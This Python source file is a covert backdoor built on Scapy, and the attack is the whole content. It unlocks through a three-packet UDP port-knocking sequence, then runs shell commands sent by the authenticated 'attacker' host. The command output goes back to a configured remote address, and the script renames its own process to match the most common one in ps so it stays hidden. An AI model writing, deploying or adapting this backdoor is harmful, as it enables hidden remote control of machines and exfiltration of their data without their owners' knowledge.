#/usr/bin/python

# pip install scapy
# dnf install redhat-rpm-config
# Unzip the setproctitle file by:
# tar -xvzf setproctitle-1.1.10.tar.gz
# Go to setproctitle directory and type:
# python setup.py install
import socket, os, sys, time, logging
from scapy.all import *
import setproctitle
import config

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
code = 0
attackerIP = ""


def portKnocking(packet):
    global code
    global attackerIP
    ports = config.portKnocks
    if IP in packet:
        if UDP in packet:
            srcAddr = packet[IP].src
            srcPort = packet[UDP].sport
            if srcPort == ports[0] and code == 0:
                code = 1
                print("{} : Knock 1".format(srcAddr))
            elif srcPort == ports[1] and code == 1:
                code = 2
                print("{} : Knock 2".format(srcAddr))
            elif srcPort == ports[2] and code == 2:
                code = 3
                attackerIP = srcAddr
                print("{}: Knock 3. Authetication succeed.".format(srcAddr))
            else:
                print("Authetication failed. Wrong sequence...")

def craftPacket(data):
    packet = IP(src=config.localIP, dst=config.remoteIP)/UDP(sport=config.localPort, dport=config.remotePort)/Raw(load=data)
    return packet

def executeCmd(packet, cmd):
    print("Executing command: {}".format(cmd))
    result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    result = result.stdout.read() + result.stderr.read()
    print("Result: %s" % result)
    packet = craftPacket(result)
    send(packet)
    time.sleep(0.1)


def parsePacket(packet):
    if packet.haslayer(IP) and packet.haslayer(Raw):
        if packet[IP].src != attackerIP:
            return
        payload = packet['Raw'].load
        payload = payload.decode("utf8")
        cmd = payload.split(' ')
        cmdType = cmd[0]
        if cmdType == "shell":
            cmdString = ' '.join(string for string in cmd[1:])
            executeCmd(packet, cmdString)
            sys.exit(0)
        elif cmdType == "exit":
            print("Backdoor exited.")
            sys.exit(0)
        else:
            print("Incorrected command")

def checkRootPrivilege():
    if os.getuid() != 0:
        sys.exit("This application have to run with root access. Try again")

def maskProcess():
    # Get the most common process for ps command
    cmd = os.popen("ps -aux | awk '{ print $11 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
    cmdResult = cmd.read()
    setproctitle.setproctitle(cmdResult)
    print("Most common process for ps command: {}".format(cmdResult))

def main():
    maskProcess()
    checkRootPrivilege()
    while code != 3:
        sniff(filter="udp and dst port {}".format(config.listenPort), prn=portKnocking, count=1)
    while True:
        sniff(filter="tcp and dst port {}".format(config.localPort), prn=parsePacket, count=1)

if __name__ == '__main__':
    main()
